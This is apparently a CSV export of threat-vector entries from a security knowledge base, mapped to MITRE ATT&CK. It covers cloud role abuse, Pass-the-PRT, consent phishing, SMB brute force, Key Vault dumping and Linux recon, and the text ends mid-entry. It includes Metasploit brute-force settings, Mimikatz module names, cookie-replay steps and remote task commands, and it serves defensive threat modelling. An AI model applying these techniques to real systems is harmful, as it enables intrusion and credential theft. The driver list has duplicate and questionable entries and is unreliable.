f1dc4341-eb45-4d07-8075-b1a6b227cc76,Cloud IAM role assumption,Threat Vectors,clear,"Once adversaries gained a set of creentials, they will
try to discover and leverage identity policies to increase their
control over the infrastructure. This is especially the case for
instance credentials, which can be stolen through exploitation.

Changing roles will allow the adversary to assume a
more powerful role, escalate privileges and eventually move further
in the cloud to achieve objectives. This can be particularly
impactful if cross account roles are leveraged.",2,2022-05-19,2025-01-01,,,,"[Enterprise] APT29, UNC2452",T1098.003
ebdf49a9-52cb-43a5-8849-8110765f4fe1,Suspicious Disk Image Files extracted via File Archiver from Email or Download directory,Threat Vectors,clear,"Disk image files, such as ISO or IMG files, are being used more lately in malware 
distribution through phishing emails or malicious download links. 
This works because, as part of their nature, disk image files bypass some email 
security filters and may not be automatically viewed as threats to the users 
or security applications. This is traditionally a technique that has been used 
by a number of threat actors. One common example in this regard is when 
spearphishing emails have attached disk image files masquerading as some sort 
of legitimate document or even software updates. Once a user opens the attached 
disk image file, it mounts as a virtual drive on his system. The user may 
then be tricked into running a malicious payload inside, such as a 
shortcut file (.lnk) or an executable with its icon cloaked to appear familiar. 
Users are prone to feel secure when they select files with familiar types 
and might not see the danger in mounting and opening disk images coming 
from unverified sources.",1,2024-10-22,2024-10-22,,,{'support::enabling': ['dd5d942c-bac4-4000-b9a6-ca4fef6cfb84']},"[Enterprise] APT29, UNC2452, [ICS] Wizard Spider, UNC1878, [Enterprise] TA505, TA505","T0865, T1204.002, T1059"
f16deda4-65b1-4825-8042-fe15524d0ce1,Abnormal Windows service creation or modification attempt,Threat Vectors,clear,"A threat actor may attempt to create Windows services in order to start and
run software or scripts that allow the threat actor to perform actions that
controlling a Windows service allows to perform.   

This may include: Establishing persistence, runnning cryptominers, 
communicating with command&control, launching remote actions or moving 
laterally.  

Persistence using Windows service creation may be achieved in many ways, 
see TVMs chained from this one.   

Threat actors may try to evade detection by using well-known service names 
or names that very closely resemble something that would look legit on a 
Windows platform. For example  ""WinHTTP Web Proxy Auto-Discovery"" or 
""TCP/IP NetBIOS Help"" [CRN-01]  

Some other example for creation/change of the current state of a service
may appaear on a DC (Domain Controller). For example, events in the
EventLog with ids: 7036, 7040, 7045 and 4697 indicate some of the possible
creation or modification of services on a DC.  

Creation or modification of a service on the system may lead to
altering in the binaries and registries of the affected system.
Such changes/modifications can also interfere with the other
processes related to other services on the system. Each service
has so called threads or sub-processes related to the main one.
A change in one service or its thread can impact or compromise
some of the related ones.    
",1,2023-02-07,2024-05-23,,,,"[Enterprise] Deep Panda, APT19, [Enterprise] APT32, APT32, [ICS] APT38, Lazarus Group, [Mobile] APT41, APT41","T1543.003, T1112, T1055"
d11bfb38-3a0c-4e38-a973-efa2da1e8a73,Scheduled task created on remote endpoint,Threat Vectors,clear,"Adversaries with access to the right credentials can create scheduled tasks 
remotely from an endpoint they control for malicious purposes, which often 
include outbound connections to attacker infrastructure, binary execution, 
achieve persistance or registry entry editing or creation, but in this case
the remote scheduled task achieves lateral movement. 

Adversaries can create and configure scheduled tasks on remote endpoints 
using either the task scheduler or PowerShell.

One example syntax used to create a new task on a remote computer is to 
use \computername

Examples: 

at \\computername time/interactive | /every: date, ... /next: date, ... command
at \\computername id/delete | /delete /yes

Run a scheduled task on a remote mashine using PowerShell, example:

schtasks /run /s ComputerName /tn “description”

Using the task Scheduler, as example: > ""Connect to Another Computer"", 
provide the IP address of the remote system and select ""Connect as another 
user"" > ""Set User"".
",1,2022-12-15,2022-12-15,,,,,"T1053, T1053.005"
e8761933-3137-41f7-bf7a-2687cac68524,ProcDump cookie exfiltration,Threat Vectors,clear,"Cookies can be found on disk and also in process memory. Additionally other 
applications on the targets machine might store sensitive authentication
tokens in memory (e.g. apps which authenticate to cloud services). 

ProcDump is a Sysinternal tool to dump strings from any process.

Using the example of the Firefox browser, an attacker can steal the browser 
cookies via ProcDump following the steps below:

  - Acquire the cookie from the user browser via process dump.
  - Exfiltrate the necessary authentication cookies.
  - Open Firefox on the attackers machine.
  - Navigate to the resource to access (the domain the cookie is valid for).
  - Use the Developer Console and set the cookie via document.cookie=“key=value”.
",1,2024-11-05,2024-11-05,,,"{'sequence::succeeds': ['ec8201d4-c135-406b-a3b5-4a070e80a2ee'], 'atomicity::implements': ['b0d6bf74-b204-4a48-9509-4499ed795771']}","[Enterprise] APT29, UNC2452, [Mobile] Sandworm Team, GreyEnergy",T1111
6e988fa7-69c9-4aef-897c-a34fa5066dac,Ghost logins attempts,Threat Vectors,clear,"Ghost logins is a technique that exploits the fact that SaaS user accounts
often enable multiple simultaneous logins using different sign-in methods. 

Ghost logins can be used for both the initial access and persistence stages of
a cyber attack, doubling up as a defense evasion technique because of low login
method visibility.

For initial access, the technique exploits the fact that local and SSO logins
can exist simultaneously. Given that many apps are self-adopted by users, it is
likely that many users will default to a local username and password login at 
this stage. If the app is later adopted companywide and brought into SSO,
the original local login will continue to exist unless explicitly disabled or deleted.

Because MFA is applied at the app and IdP level independently, it is possible to
end up with an SSO login that requires MFA (via the IdP login), but a local
login that does not. This creates an easy target identity for attackers to look for.

When combined with other identity vulnerabilities such as weak, breached, and/or
reused passwords, attackers can easily automate ghost login discovery and
exploitation at scale.  

Ghost logins can also be created after an attacker has established access to an app.
For example, if a social login is used to access an account, an adversary may be 
able to configure a separate username/password login, or even connect a second
social account that the adversary controls.

If the account has sufficient privileges, it may also be possible to set up or
change the SAML login settings to inject a malicious URL, for example to an
attacker controlled tenant.
",1,2024-11-06,2024-11-11,,,{'atomicity::implements': ['4a807ac4-f764-41b1-ae6f-94239041d349']},,"T1556, T1078.003"
b1b6d2d7-0832-46fc-a3e5-6e6411179c45,Pass the Primary Refresh Token (PRT),Threat Vectors,clear,"Pass-the-PRT (Primary Refresh Token) is an advanced cyberattack technique targeting 
cloud environments, particularly Microsoft Entra ID (formerly Azure AD). It enables 
attackers to bypass MFA and move laterally within cloud infrastructures by stealing
and exploiting valid authentication tokens.

### What is a Primary Refresh Token (PRT)?
A PRT is a persistent authentication token issued when a user logs into an Azure-joined 
or hybrid Azure-joined Windows 10+ device. It enables single sign-on (SSO) to Azure 
AD resources without reauthentication. Key characteristics:
- **Validity**: 14–90 days, depending on usage.
- **Storage**: Securely stored in the device’s LSASS memory and protected by the 
Trusted Platform Module (TPM).
- **Function**: Contains user identity, session keys, and MFA claims, allowing seamless 
access to cloud resources like Microsoft 365.

### How Pass-the-PRT Works
Attackers execute this attack in three stages:

1. **Initial Compromise**:  
  Gain access to a victim’s device via phishing, malware, or exploits. Local admin 
  privileges are typically required.

2. **PRT Extraction**:  
  Extract the PRT and associated session key using tools like:
  - **Mimikatz** (`sekurlsa::cloudap` module).
  - **AADInternals PowerShell** (e.g., `Get-AADIntUserPRTToken`).
  - **BrowserCore.exe** (to steal the `x-ms-RefreshTokenCredential` cookie).

3. **Lateral Movement**:  
  Use the stolen PRT to:
  - Generate valid PRT cookies for browsers (Chrome/Edge).
  - Request access tokens for Azure AD resources without triggering MFA.
  - Move laterally across cloud applications and data as the compromised user.

### Key Risks and Challenges
- **MFA Bypass**: PRTs embed MFA claims, allowing attackers to bypass conditional 
access policies.
- **Stealth**: Attacks mimic legitimate user activity, evading traditional security 
tools.
- **Persistence**: PRTs remain valid for weeks, enabling prolonged access even if 
passwords change.
",1,2025-06-30,2025-06-30,,,"{'sequence::preceeds': ['66aafb61-9a46-4287-8b40-4785b42b77a3', 'dd5d942c-bac4-4000-b9a6-ca4fef6cfb84']}",,"T1134, T1539, T1550.004"
518ff777-f10d-4201-9e54-2779c31c512e,Consent phishing attack,Threat Vectors,clear,"In consent phishing, attackers create a phishing scheme, such as emailing a user with a
link to a required password update. If the user clicks the link, they are redirected to
a Microsoft 365 permission request. It may include this language:

“This app would like to
  Read your contacts
  Read and write access to your mail
  Send mail as you
  Sign you in and read your profile”

If the user consents to the permission request, the third-party app, controlled by the
attacker, will have high-level access to their account. The attacker can then use the 
account without actually having credential access or MFA codes.


## How the attack works

There are two components for a successful consent phishing attack, the OAuth 2.0
authorization protocol and social engineering.

OAuth 2.0 providers are used to allow applications to access a user's resources 
without needing passwords. If a user wants to use a new application, they may be 
presented with an option to sign up using their Google account, for example.
If they choose this option, Google will send an authorization code which will 
share the information needed to create an account.

Attackers exploit this permission step. They can register a malicious app with
an OAuth 2.0 provider to trick users into thinking it is a legitimate and trusted
source. Below are the steps typically seen while deploying a malicious OAuth app:

- Register a new single tenant application with the naming convention of
  [domain name]_([a-zA-Z]){3} (for example: Contoso_GhY)
- Add the legacy permission Exchange.ManageAsApp which can be used for app-only
  authentication of Exchange Online PowerShell module
- Grant admin consent to the above permission
- Give global admin and Exchange Online admin roles to the previously 
  registered application
- Add application credentials (key/certificate/both)  


Social engineering is also an important part of a consent phishing attack. 
Consent phishing emails are typically well crafted: the email is branded with a
spoof but legitimate-sounding business company, and the malicious link looks real
because the app had been properly registered with an OAuth 2.0 provider.

The legitimate components within a consent phishing campaign make it more dangerous.
Even the use of security measures such as MFA is no match for consent phishing.
The attack happens after the credentials have been entered and then acts
post-authentication to carry out persistent access to user data.

The consent phishing email also tricked users by playing on a sense of urgency 
and concern to review and sign an important business document. Here is what a
consent phishing attempt usually looks like:

- The attacker registers a malicious app with an OAuth 2.0 provider (eg. Azure AD).
- The app carries a reliable name and structure not to raise suspicion.
- The attacker sends a phishing email with a link to a user, asking to grant
  permission to the malicious app.
- The user clicks on the OAuth 2.0 URL which generates an authentic permission request.
- The user grants access to a malicious app, and an authorization code is sent
  to the attacker.
- The authorization code is redeemed for access tokens which an attacker uses
  to gain access to user data.

Once the user accepts the message, their data becomes accessible to the attacker.
This can include email, contacts, forwarding rules, files, notes, profile, etc.
",1,2024-10-23,2024-11-05,,,"{'sequence::succeeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df'], 'atomicity::implements': ['b0d6bf74-b204-4a48-9509-4499ed795771']}","[Mobile] APT28, APT28, [Enterprise] APT29, UNC2452",T1566.002
fa4c66c6-a69b-4e16-84cb-7ad8c772af41,SMB login brute force,Threat Vectors,clear,"SMB (Server Message Block) brute-force is a type of cyber attack where an
attacker attempts to guess the password for an SMB share by trying a large
number of possible passwords. The goal is to gain unauthorised access to
the SMB share, which can contain sensitive data, such as files, folders,
and other resources.

### Different methods and techniques used by the threat actors to brute-force an SMB share

- Dictionary attacks - a threat actor is using in this type of an attack a
list of common passwords, such as words, phrases, and combinations of
characters, to try and guess the password.
- Brute force attacks - a threat actor is trying all possible combinations
of characters, numbers, and special characters to guess the password.
- Password spraying - in this technique a threat actor uses a small number
of common passwords against a large number of usernames, in an attempt to
guess the password for at least one account.
- Hybrid attacks - combining dictionary and brute force attacks to try and
guess the password.
- Rainbow Table Attacks - this is a possible brute-force attack in which a
threat actor is using precomputed tables of hash values for common
passwords to try and guess the password.
- Exploiting weak passwords - a threat actor may identify and exploit weak
passwords, such as default passwords, easily guessable passwords, or
passwords that have not been changed in a long time.

They can use eumeration tools like nmap, smbclient, Metaspoit and others to
listen for an open SMB port and perform automated brute-forcing password
matches against an SMB share. 

### Automated script tools used for SMB brute-force attack

Threat actors may use different automated tools which have the capability
to use a wordlist and to try logon attemts to an SMB share. For example,
bat, batch, PowerShell or other type of scripts and tools based on these
scripts ref [3], [4], [5], [7].  

Examples:

- smbrute.bat              (uses `passlist.txt` wordlist) ref [3];
- Smb.bat script           (uses `Wordlist.txt` wordlist) ref [4];
- SMBLogin.ps1 script      for more information ref [5]. 
- smblogin-extra-mini.ps1  (uses .\smblogin.results.txt wordlist)
  Minimalistic offensive tool based on PowerShell ref [7].

### Metasploit auxiliary module brute-force SMB share

A threat actor can use a Metasploit auxiliary scanner module to brute force
the SMB credentials. In the example below `<user_file>.txt` is a set of
user's possible names and `<password_file>.txt` is a list of possible user's
password for brute-force attack ref [2].   

Example: 

```
> set RHOST <ip_address>
RHOST => <ip_address>
> set PORT 445
RPORT => 445
> set user_file ./<user_file>.txt
user_file => ./<user_file>.txt
> set password_file ./<password_file>.txt
password_file => ./<password_file>.txt

```
Metaspoit `run` command runs the auxiliary module and displays if there are
found successful brute-force credentials matches. 

```
msf5 auxilary(scanner/smb/smb_login) > run

```
",1,2025-07-21,2025-08-07,,,{'atomicity::implements': ['cc546bbc-f71c-4538-934c-415d6adc293b']},"[Mobile] APT41, APT41","T1110, T1110.001"
479a8b31-5f7e-4fd6-94ca-a5556315e1b8,Pass the hash using impersonation within an existing process,Threat Vectors,clear,"Adversaries may use a particular flavor of pass the hash - to leverage 
an acquired handle (hash) on NT AUTHORITY\SYSTEM access token to spawn a 
new NT AUTHORITY\SYSTEM context process, impersonate the token for this
process into the attacker-desired existing thread, and then kill the 
spawned NT AUTHORITY\SYSTEM process again, making it a temp process used
to allow the threat actor to elevate privileges to NT AUTHORITY\SYSTEM.

This sets the technique apart from spawning a new process with the 
attacker-desired privileges that pass the hash without use of the 
/IMPERSONATE option leads to. 

Elevating privileges on Windows to System allows a threat actor (or 
sysadmin) to do things that are not possible without SYSTEM/root 
privileges.

Pass the hash is a method of authenticating as a user without having 
access to the user's cleartext password by stealing password hashes. This 
method bypasses standard authentication steps that require a cleartext 
password, moving directly into the portion of the authentication that uses 
the password hash. 

Mimikatz sekurlsa module with the /impersonate option implements this
particular approach as an option alongside other more known NTLM based
procedures.
",2,2022-11-15,2024-05-15,,,,"[Mobile] APT28, APT28, [Enterprise] APT1, APT1, [Enterprise] APT32, APT32, [Enterprise] Chimera, [Enterprise] GALLIUM, GALLIUM, [Enterprise] Kimsuky, TA406",T1550.002
f79a55a2-95bf-446d-a667-1bcf00f1b9f1,Files retrieved via SMB connection,Threat Vectors,clear,"
### The SMB Protocol
SMB stands for Server Message Block. It is a network protocol used to 
share data between computers and devices on a local or wide area network. 
The protocol allows local network computers to interact with file shares.

Threat actors frequently exploit SMB for their nefarious activities. 
One common tactic involves leveraging SMB to interact with file shares, including Microsoft Sharepoints, OneDrive or some NAS servers. 
In doing so, adversaries can pull malicious files from compromised endpoints, 
paving the way for the execution of additional malicious code. 
This method poses a significant threat, as it allows for the clandestine transfer of harmful files between systems, 
thereby supporting lateral movement within the network. 
Threat actors may exploit inherent file sharing protocols like SMB/Windows Admin Shares, 
either to connected network shares or through authenticated connections via Remote Desktop Protocol.

Moreover, the embedding of files can serve as a vector for initiating SMB connections. 
For instance, embedded files containing links executed by Office applications may establish 
connections with SMB servers under the threat actor's control. This technique allows threat actors to exploit unsuspecting users, 
initiating SMB connections that may lead to the execution of malicious code.

In a more advanced scenario, threat actors might specify a malicious server, 
directing the SMB protocol to facilitate further code execution. 
This strategic move enables them to retrieve various types of files, potentially leading to widespread infection across entire machines within the network. 
The ability to specify a malicious server amplifies the threat, 
as it allows threat actors to exercise greater control over the execution and distribution of harmful payloads, posing a severe risk to the overall security of the network.
",2,2023-07-17,2023-10-06,,,,"[Enterprise] APT29, UNC2452, [Enterprise] Blue Mockingbird, [Mobile] APT41, APT41, [Mobile] APT28, APT28","T1570, T1021.002, T1021.007"
a5f631c3-6fb0-484f-89e4-c8b2e038db8f,Scheduled tasks created with PowerShell,Threat Vectors,clear,"A threat actor can use PowerShell to create tasks for nefarious purposes. 

Scripts requires admin rights to create a new scheduled task. The script 
will run in the context of the user who created the scheduled task.

Scheduled tasks are typically used to either connect to adversary 
infrastructure, establish persistence or to execute binaries.
",1,2022-12-15,2022-12-15,,,,,T1053.005
4a807ac4-f764-41b1-ae6f-94239041d349,MFA Bypass Techniques,Threat Vectors,clear,"MFA is a technique that requires more than one piece of evidence to authorize the user to 
access a resource. If two pieces of evidence are needed to verify, this approach is called 2FA.
The difference between 2FA and MFA is that 2FA requires only two factors; on the other hand,
MFA can add more layers until the login attempts do not seem suspicious anymore.

A MFA bypass is a broad term referring to an attack method where a cybercriminal 
navigates around MFA requirements to gain unauthorized access to an account.
",1,2024-11-04,2024-11-05,,,,"[Enterprise] APT29, UNC2452, [Mobile] Sandworm Team, GreyEnergy, [Enterprise] Chimera, [Enterprise] Kimsuky, TA406, [Mobile] LAPSUS$, LAPSUS","T1111, T1621, T1566.001, T1566.002, T1566.004"
db749144-8044-4479-ab34-bff22251a1d7,Named pipe creation using a predictable naming convention,Threat Vectors,clear,"A threat actor may deploy named pipes are part of an automation process to achieve a goal.
As example, this could be the Cobalt Strike keylogger deployment, where the cobalt Strike
operator merely clicks a button in the UI to deploy the keylogger, and behind the scenes 
this runs an automation on the compromised endpoint, which includes the creation of a named 
pipe, which in this case will have a predictable name, unless the CS operator changes this 
during the deployment (manual config in CS possible to deploy with custom named pipe name)
",2,2023-01-06,2023-01-17,,,,"[Enterprise] Mustang Panda, RedDelta, [ICS] TEMP.Veles, TEMP.Veles, [Enterprise] APT37, APT37, [ICS] Wizard Spider, UNC1878, [Enterprise] Chimera, [Enterprise] APT29, UNC2452, [ICS] FIN7, FIN7, [Enterprise] menuPass, APT10, [Mobile] APT41, APT41, [ICS] FIN6, FIN6, [Enterprise] TA505, TA505, [Enterprise] APT32, APT32, [Enterprise] Aquatic Panda, Tonto Team, [Enterprise] Leviathan, APT40, [Enterprise] Deep Panda, APT19",T1056.001
09aec351-7dfb-4cde-8570-d3c7a36e1241,Azure - KeyVault Dumping,Threat Vectors,clear,"In this threat vector an attacker extracts secrets, certificates, or keys from an 
Azure Key Vault to facilitate further attacks or lateral movement within the environment.

### Example Attack Scenario

After compromising an Azure AD account, this account has roles like Key Vault Contributor 
on a resource group but lacks direct Key Vault data read access through RBAC. However, 
the vault is configured with traditional access policies instead of RBAC, allowing 
the attacker to add their own user or service principal to the policy with all permissions. 
After updating the policy, the attacker can now dump all secrets, keys, and certificates 
stored in Key Vault, including API keys, credentials, and cryptographic material 
for critical applications.

### Attack Goals and Impact

The primary goal is to gain **unauthorized access** to highly sensitive material 
such as application secrets, encryption keys, database credentials, or signing certificates. 
This can lead to:
- Complete compromise of applications relying on Key Vault for secure secret storage
- Lateral movement by using dumped secrets to authenticate to other Azure resources
- Escalation of privileges by harvesting secrets that give broader access within the Azure environment
- Undetected persistence if logging is disabled or improperly configured on the Key Vault.

Business impact can include significant data breaches, loss of integrity for business 
processes, and regulatory repercussions due to exposure of protected credentials.

### Attack Flow and Methodology

- The attacker compromises a privileged Azure account or service principal.
- They enumerate assigned roles and discover Key Vault Contributor permission on a resource group.
- If the targeted Key Vault uses access policies instead of RBAC, the contributor 
can add themselves to the vault’s access policy with full access rights.
- With the new policy, the attacker calls Key Vault data plane APIs to list and 
retrieve all stored keys, certificates, and secrets. For example:
  - `Microsoft.KeyVault/vaults/secrets/getSecret/action`
  - `Microsoft.KeyVault/vaults/certificates/read`
  - `Microsoft.KeyVault/vaults/keys/read`
- Extracted credentials are used to access protected resources elsewhere, potentially 
chaining this access for lateral movement.
- If Key Vault logging is not enabled, this activity may go undetected unless anomalous 
pattern detection (such as sudden bulk secret access or policy changes) triggers alerts.
",1,2025-09-16,2025-09-17,,,"{'support::enabled': ['81338b90-f80c-40cc-8a57-ba97cdf86948', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '2743bf18-3b86-4721-bf3e-153dcda0b149', '53063205-4404-4e6d-a2f5-d566c6085d96'], 'support::synergize': ['bcf3bb96-ed97-4853-98ab-937c2d214f4e', 'ce7194f8-2398-4e79-b964-162ca5ee175b', '37381f28-ad9f-40c3-80f8-d8a82d6ce9a3']}",,"T1555.005, T1078.004, T1098.001"
5e6af460-db12-4278-b44d-7a7a3fa7fe76,BRICKSTORM file manager exposes end-user's HTTP APIs and UI,Threat Vectors,clear,"One of the observed China-nexus cluster achieves their goals with
the involvement and the usage of previously unknown vulnerabilities
(a.k.a., zero-days) alongside with low-noise backdoors like `BRICKSTORM`
family.

The unauthorised access provided by `BRICKSTORM` grants attackers the
ability to execute file management and network tunneling functions
crucial for espionage. These capabilities enable them to browse file
systems, create or delete files and directories, and establish network
connections to facilitate lateral movement within the compromised
environment. Unlike many other forms of malware that create noticeable
disruptions, BRICKSTORM's operations are meticulously crafted to avoid
detection, maintaining a consistent and clandestine presence within
the target network ref [3]. 

Recently identified `BRICKSTORM` executables provide threat actors
with a file manager named `BRICKSTORM file manager`.   

The `BRICKSTORM file manager` exposes an HTTP API and rudimentary UI
(User Interface) encapsulated within the protocol. The backdoor's
JSON-based API provides a wide range of file-related actions such
as uploading, downloading, renaming, and deleting files.

Adversaries can further-more create or delete directories as well
as list their contents. The BRICKSTORM panel is served by the malware
itself and proxied through its protocol towards a Command & Control
server. Further this functionality and specific behavior allows the
adversary to select a drive they wish to browse. Once the drive is
selected, BRICKSTORM allows the adversaries to browse through the
file system and download files by their choice ref [1].  
",1,2025-04-23,2025-05-20,,,{'atomicity::implements': ['901dd804-00cc-4034-85aa-3d10e257c16c']},"[Enterprise] APT3, APT3","T1190, T1204, T1071.001, T1082, T1588, T1552"
4805a7a1-807c-4869-aefe-3047823f64b5,Azure - Soft-Delete Recovery,Threat Vectors,clear,"The following threat vector deals with adversaries exploiting the soft-delete state 
of resources to restore sensitive or critical data that was intended for deletion. 
Below is a detailed analysis including an example scenario, attack goals and impact, 
and attack flow.

### Example Attack Scenario

An attacker obtains administrative access to an Azure subscription, targets a critical 
asset—for example, a Key Vault, Storage Account, or a backed-up Virtual Machine—and 
deletes it from the environment. Because Azure’s soft delete is enabled (default 
for many services), the deleted resource enters a ""soft-deleted"" state rather than 
being permanently erased. The adversary, maintaining access, then restores the asset 
from its soft-deleted state at a later time, thus retrieving encryption keys, sensitive 
secrets, storage blobs, or entire VM backup images. This could be leveraged for 
further compromise, data exfiltration, or extortion, such as during a ransomware 
attack where the goal is to restore and leak or manipulate sensitive data.

### Attack Goals and Impact

- The primary goal is to **retrieve or reinstate sensitive data or backup artifacts** 
which were meant to be irretrievably deleted, thus bypassing standard data sanitization 
or incident response clean-up.
- Attackers may also restore resources to maintain persistence, retrieve secrets, 
or conduct business disruption by manipulating the retention window of these soft-deleted resources.
- The impact includes:
  - **Regaining access to critical secrets or data thought to be purged** (e.g., 
  access keys in a Key Vault, confidential files in a Storage Account, or disk images 
  from VM backups).
  - **Circumventing incident remediation efforts** (e.g., after a ransomware event 
  when defenders try to remove access, attackers reverse the cleanup).
  - **Using restored data for secondary attacks**, such as extortion by leaking 
  previously ""deleted"" data, or using recovered credentials to move laterally within 
  or outside the environment.

### Attack Flow and Methodology

- **Resource Deletion**: The attacker deletes valuable resources (such as Key Vaults, 
Storage Accounts, or VM Backups).
- **Soft Delete Retention**: Azure's soft-delete feature retains these resources 
for a specified period (typically 14 days by default, extendable up to 180 days).
- **Resource Recovery**: Using recovered or maintained admin access, the attacker 
issues recovery actions, restoring the soft-deleted objects back to an active state, 
and proceeds to exfiltrate or abuse the recovered data.
- **Post-Exploitation**: Data is accessed, secrets are used for persistence or lateral 
movement, or assets are further manipulated or exposed depending on the attacker’s 
objectives.
",1,2025-09-18,2025-09-19,,,"{'support::enabled': ['53063205-4404-4e6d-a2f5-d566c6085d96', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '4e7eae8e-6615-41f2-bfe1-21a04f7a6088', '81338b90-f80c-40cc-8a57-ba97cdf86948', '41f57a57-1ed6-407e-bb70-a0f6ab52af10', '2d7ed070-e5c5-4796-b150-ea1d02ed1785'], 'atomicity::implemented': ['2743bf18-3b86-4721-bf3e-153dcda0b149'], 'support::synergize': ['2c6058fb-21db-47fe-99bc-a07cb70c53e4'], 'support::enabling': ['37381f28-ad9f-40c3-80f8-d8a82d6ce9a3']}",,"T1530, T1490, T1485"
a5761988-391d-4cd3-8ade-690bd3315943,Use of legitimate still vulnerable drivers to elevate privileges,Threat Vectors,clear,"Threat actors can use legitimate and code-signed, but vulnerable drivers to 
execute kernel-level code in order to elevate privileges or disable security 
products. Such drivers can allow malicious actors to manipulate system 
components, processes, maintain persistence on a system and evade security 
products ref [1].

Microsoft and other vendors have created and maintain vulnerable driver 
lists ref [2], [6], [7], for example to thwart and isolate drivers which are 
vulnerable or with a high risk for explaoitation. The drivers with a 
previously discovered vulnerabilites can also be considered for review and
as good candidates for a block list or monitoring.  

The vulnerable signed drivers can come from a variety of vendors such as,
but not limited to, ASROCK, ASUSTeK, IBM.  

### List of some vulnerable signed drivers, which have been exploited in 
the past

- `win32k.sys` - it's a kernel-mode driver that has been exploited in
   various ways, including elevation of privilege (EoP) vulnerabilities.
- `splwow64.sys` - this is a vulnerable driver which lets local code
  escalation by abusing the print stack broker.
- `dxgkrnl.sys` - this driver is responsible for graphics rendering and has
  been vulnerable to exploits. It's related to a validation flaw enabling
  local EoP in the DirectX graphics kernel driver.
- `tdx.sys`: The TDx driver has been exploited in the past, including a
  vulnerability that allows remote code execution (RCE). Other vulnerability
  buffer over-read allows local EoP on multiple Windows versions; patched
  July 2025.
- `splwow64.sys` - this driver is responsible for print spooling and has
   been vulnerable to exploits.
- `cng.sys` - the Cryptography Next Generation (CNG) driver has been
  exploited, including a vulnerability (CVE-2020-1145) that allowed EoP.
- `msrpc.sys` - it's Microsoft Remote Procedure Call (MSRPC) driver has been
  vulnerable to exploits. 
- `ucx01000.sys` - this driver is part of the USB driver stack and has been
  exploited. 
- `ndis.sys` - the Network Driver Interface Specification (NDIS) driver has
  been vulnerable to exploits. Example for an exploit: EoP precedent where
  buffer length checks were insufficient.  
- `wdf01000.sys` - this is Windows Driver Framework (WDF) driver which can
   be exploited by the threat actors for privilege escalation and other
   purposes.
- `storport.sys` - the Storage Port driver can be vulnerable to exploits.
",1,2025-08-18,2025-08-22,,,,"Turla, [Enterprise] Turla, Caramel Tsunami","T1547.006, T1068, T1547"
f33a693b-04cd-476e-9067-9deab561e55a,Move laterally with SMB by abusing WMI,Threat Vectors,clear,"Windows management instrumentation (WMI) is a tool that is implemented as service to locally
and remotely manages data, operations and configuring settings on windows operating systems.
WMI allows the administrator to see how the Operating system operates, what are its configurations
and properties and to automatically collect a systems hardware and software data. It is supporting other
scripting languages like Windows Script Host, VBScript, and PowerShell. WMI can be interacted
locally and remotely. WMI is a powerful tool which allows the threat actor to install backdoor, 
code execution as well as do lateral movement.
As the threat actor has the valid credentials (password or hashes) they can specify malicious events to
happen for example every time the victim restarts the computer run the executable that is present
in the specified directory.

Payload loaded may allow the threat actor to make a separate call to the Remote Procedure Call (RPC) 
on the victim machine, which is running over the SMB protocol.
The named pipe is then used to move laterally with the protocol.",2,2023-08-17,2025-01-01,,,,"[Enterprise] APT32, APT32, [Enterprise] APT29, UNC2452, [Enterprise] Blue Mockingbird, [Enterprise] Chimera, [Enterprise] Cobalt Group, Cobalt, [ICS] FIN6, FIN6, [ICS] FIN7, FIN7, [Enterprise] GALLIUM, GALLIUM, [Enterprise] Gamaredon Group, Gamaredon Group, [ICS] APT38, Lazarus Group, [Enterprise] Leviathan, APT40, [Enterprise] Magic Hound, TA453, [Enterprise] menuPass, APT10, [Enterprise] MuddyWater, MuddyWater, [Enterprise] Mustang Panda, RedDelta, [Enterprise] APT30, APT30, [ICS] OilRig, OilRig, [Mobile] Sandworm Team, GreyEnergy, [ICS] Wizard Spider, UNC1878","T1570, T1047"
9bb31c65-8abd-48fc-afe3-8aca76109737,Azure - Modify federation trust to accept externally signed tokens,Threat Vectors,clear,"Once they acquired sufficient priviledges,attackers add their own certificate as 
a trusted entity in the domain either by adding a new federation trust to 
an existing tenant or modifying the properties of an existing federation 
trust. As a result, any SAML token they create and sign will be valid for 
the identity of their choosing. This attack may be performed as an alternative
to the Golden SAML attack to gain persistent access without having to sign 
the SAML response at each access request, while needing the same amount of control 
over the ADFS server.",4,2022-03-06,2025-01-01,,,,"[Enterprise] APT29, UNC2452",T1484.002
4f0f3e9c-8d61-422c-9c13-809aa75cab59,Host information gathering in Linux systems,Threat Vectors,clear,"Host information gathering in Linux can be a part of a reconnaissance
process, allowing threat actors to understand the target system details and
configuration, collect valuable information and identify potential
vulnerabilities on the host.  

### Possible information gathering on Linux system

- A hostname and domain name - a threat actor may use the `hostname` command
  to retrieve the system's hostname and domain name.
- IP address: usage of `ip addr` or `ifconfig` commands can retrieve the
  system's IP address. The IP address of the system is a valuable piece of
  information for future collection and reconnaissance activities.
- Network interface configuration: the command `ip link` or `ifconfig` is
  used to retrieve information about network interfaces, including IP
  addresses, subnet masks, and default gateways.
- Operating system and version: a threat actor can use `uname -a` or
  `cat /etc/os-release` command to retrieve information about the operating
  system and its version. A command like `uname` can display information
  about the system, for example the kernel name, version, and the Linux
  architecture.  
- Kernel Version: with the command `uname -r` an attacker can retrieve the
  kernel version of a targeted system.
- CPU architecture: a threat actor may use the `uname -m` command to
  retrieve the CPU architecture. A threat actor may also use `lscpu` on Linux
  to gather CPU's capabilities like model information, number of cores,
  speeds, flags, virtualisation capabilities and other CPU related
  parameters ref [3]. 
- Memory and disk information: an attacker can use `-m` and `df -h` commands
  to retrieve information about memory and disk usage. With other commands
  like `df`, `fdisk`, or `mount` they can check the system storage and to
  find the disks attached to the system ref [2], [3].  
- Whois lookup: a threat actor can perform the command `whois` <domain_name>
  to retrieve which are the registered domains in the database record on
  the host.
- Name server lookup: a threat actor can use `nslookup` on Linux to get the
  information from a DNS server. It queries DNS to obtain a domain name, IP
  address mapping, or any other DNS record. This coomand can be used for a
  system gathering of information. 
- Environment variables: `env` or `printenv` can expose environment
  variables, which might include credentials, proxy settings, or session-
  related tokens useful for further exploitation.
- Running processes and services: commands like `ps aux`, `top` can help a
  threat actor to identify active processes and services, which may reveal
  misconfigured applications or listening services.
- Scheduled jobs: `crontab -l`, `cat /etc/crontab`, or reviewing
  `/etc/cron.*` directories can uncover automated tasks or persistence
  mechanisms.
- Listening ports and services: `ss -tuln` or `netstat -tuln` can show
  services listening on the host, along with the associated ports and
  protocols.  
  
### Known tools used for Linux information gathering

- Nmap: A network scanning tool that can be used to gather information about
  open ports and services.
- LinEnum: A tool that can be used to gather information about Linux
